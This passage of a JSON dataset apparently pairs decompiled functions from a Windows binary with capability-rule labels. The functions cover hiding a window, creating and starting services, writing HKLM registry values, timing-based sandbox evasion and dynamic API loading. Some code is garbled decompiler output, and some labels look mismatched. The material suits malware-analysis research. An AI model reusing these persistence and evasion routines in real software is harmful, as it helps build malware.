        "decompiled_code": "\nbool fcn.00404ed0(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    char *pcVar4;\n    char *var_4h;\n    \n    var_4h = NULL;\n    iVar2 = fcn.004010d0(&var_4h);\n    if (iVar2 == 0) {\n        return false;\n    }\n    if (var_4h == NULL) {\n        return false;\n    }\n    uVar3 = 0xffffffff;\n    pcVar4 = var_4h;\n    do {\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        cVar1 = *pcVar4;\n        pcVar4 = pcVar4 + 1;\n    } while (cVar1 != '\\0');\n    iVar2 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x411558, 0x411598, 1, var_4h, ~uVar3 - 1);\n    return iVar2 == 0;\n}\n",
        "token_count": 246
    },
    "00404f90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "hide graphical window"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404f90(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.USER32.dll_CreateWindowExA)\n                      (0, 0x411810, 0x41e85c, 0xcf0000, 0x80000000, 0, 0x80000000, 0, 0, 0, arg_8h, 0);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    (*_sym.imp.USER32.dll_ShowWindow)(iVar1, 0);\n    return 1;\n}\n",
        "token_count": 140
    },
    "00405000": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040505f) overlaps instruction at (ram,0x0040505e)\n// \n// WARNING: Type propagation algorithm not settling\n\nchar ** __cdecl fcn.00405000(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    char **ppcVar3;\n    char unaff_BL;\n    int32_t unaff_ESI;\n    bool bVar4;\n    \n    ppcVar3 = (*_sym.imp.ADVAPI32.dll_CreateServiceA)(arg_8h, arg_ch, arg_ch, 0xf01ff, 1, 0, 1, arg_10h, 0, 0, 0, 0, 0);\n    bVar4 = (POPCOUNT(ppcVar3 & 0xff) & 1U) == 0;\n    if (ppcVar3 == NULL) {\n        return NULL;\n    }\n    if ((bVar4) || (!bVar4)) {\n        (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(ppcVar3);\n        ppcVar3 = 0x1;\n    }\n    else {\n        puVar1 = ppcVar3 + -1;\n        uVar2 = *puVar1;\n        *puVar1 = *puVar1 + 0x15;\n        *(ppcVar3 + 0x10) = (*(ppcVar3 + 0x10) - (ppcVar3 >> 8)) - (0xffffffea < uVar2);\n        *(unaff_ESI + -0x48) = *(unaff_ESI + -0x48) + unaff_BL;\n        *ppcVar3 = *ppcVar3 + ppcVar3;\n        *ppcVar3 = *ppcVar3 + ppcVar3;\n    }\n    return ppcVar3;\n}\n",
        "token_count": 430
    },
    "00402480": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x004024c1) overlaps instruction at (ram,0x004024bc)\n// \n// WARNING: Removing unreachable block (ram,0x004024ac)\n// WARNING: Removing unreachable block (ram,0x004024b4)\n\nbool __cdecl fcn.00402480(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    code *pcVar1;\n    uint arg_ch_00;\n    uint arg_ch_01;\n    uint arg_ch_02;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_314h;\n    uint var_210h;\n    uchar lpBuffer;\n    uint var_10bh;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    lpBuffer = 0;\n    puVar3 = &var_10bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    var_8h = 0;\n    *(puVar3 + 2) = 0;\n    fcn.004011b0();\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&lpBuffer, 0x104);\n    var_4h = 0;\n    do {\n        arg_ch_00 = fcn.004049e0();\n        arg_ch_01 = fcn.004049e0();\n        arg_ch_02 = fcn.004049e0();\n        fcn.00404370(arg_10h, arg_ch_00);\n        fcn.00404370(arg_8h, arg_ch_01);\n        fcn.00404370(arg_ch, arg_ch_02);\n        pcVar1 = _sym.imp.MSVCRT.dll_sprintf;\n        (*_sym.imp.MSVCRT.dll_sprintf)(&var_314h, 0x4113a4, &lpBuffer, arg_10h);\n        iVar2 = fcn.00403ae0(&var_314h);\n        if (iVar2 != 0) {\n            (*pcVar1)(&var_210h, 0x4113b0, &lpBuffer, arg_8h);\n            iVar2 = fcn.00403ae0(&var_210h);\n            if (iVar2 != 0) {\n                (*pcVar1)(&var_210h, 0x4113b0, &lpBuffer, arg_ch);\n                iVar2 = fcn.00403ae0(&var_210h);\n                if (iVar2 != 0) {\n                    iVar2 = 1;\n                    break;\n                }\n            }\n        }\n        var_4h = var_4h + 1;\n        iVar2 = var_8h;\n    } while (var_4h < 3);\n    fcn.00404370(arg_14h, 4);\n    return iVar2 != 0;\n}\n",
        "token_count": 688
    },
    "00404aa0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404ac6) overlaps instruction at (ram,0x00404ac4)\n// \n\nuint fcn.00404aa0(void)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    bool bVar3;\n    uint uStack16;\n    \n    uStack16 = 0x411484;\n    iVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)();\n    bVar3 = iVar1 == 0;\n    if (bVar3) {\n        return 0;\n    }\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    if ((!bVar3) && (bVar3)) {\n        *0xffffff8b = *0xffffff8b - &uStack16;\n        pcVar2 = NULL;\n    }\n    *0x41e850 = (*pcVar2)(iVar1, 0x411494);\n    *0x41e854 = (*pcVar2)(iVar1, 0x4114b0);\n    *0x41e858 = (*pcVar2)(iVar1, 0x4114c0);\n    if (((*0x41e850 != 0) && (*0x41e854 != 0)) && (*0x41e858 != 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 297
    },
    "004049a0": {
        "rules": [
            "create or open file"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004049bb) overlaps instruction at (ram,0x004049ba)\n// \n\nvoid __cdecl fcn.004049a0(uint arg_8h)\n\n{\n    char cVar1;\n    uint8_t in_AL;\n    uint uVar2;\n    uint8_t *unaff_EDI;\n    bool in_CF;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    ushort in_stack_fffffff8;\n    \n    if (!in_CF) {\n        uVar2 = CONCAT22(unaff_EDI, in_stack_fffffff8);\n        if (in_CF) goto code_r0x004049ab;\n    }\n    uVar2 = 0;\n    in_AL = arg_8h;\ncode_r0x004049ab:\n    cVar1 = in_AL - *unaff_EDI;\n    uVar2 = func_0x1018a92d((in_NT & 1) * 0x4000 | SBORROW1(in_AL, *unaff_EDI) * 0x800 | (in_IF & 1) * 0x200 |\n                            (in_TF & 1) * 0x100 | (cVar1 < '\\0') * 0x80 | (cVar1 == '\\0') * 0x40 | (in_AF & 1) * 0x10 |\n                            ((POPCOUNT(cVar1) & 1U) == 0) * 4 | in_AL < *unaff_EDI | (in_ID & 1) * 0x200000 |\n                            (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000, uVar2);\n    (*_sym.imp.KERNEL32.dll_CreateFileA)(uVar2, 0xc0000000, 1, 0, 3, 0x80);\n    return;\n}\n",
        "token_count": 481
    },
    "00402790": {
        "rules": [
            "get service handle",
            "start service"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402790(uint hSCManager, uint lpServiceName)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar2 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)(hSCManager, lpServiceName, 0xf01ff);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    iVar3 = (*_sym.imp.ADVAPI32.dll_StartServiceA)(iVar2, 0, 0);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetLastError;\n    if (iVar3 == 0) {\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar3 != 0x420) {\n            iVar3 = (*pcVar1)();\n            if (iVar3 != 0x422) {\n                (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n                return 0;\n            }\n        }\n    }\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n    return 1;\n}\n",
        "token_count": 241
    },
    "00404510": {
        "rules": [
            "set registry value"
        ],
        "decompiled_code": "\nbool fcn.00404510(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x411558, 0x41159c, 4, &stack0x00000004, 4);\n    return iVar1 == 0;\n}\n",
        "token_count": 78
    }
}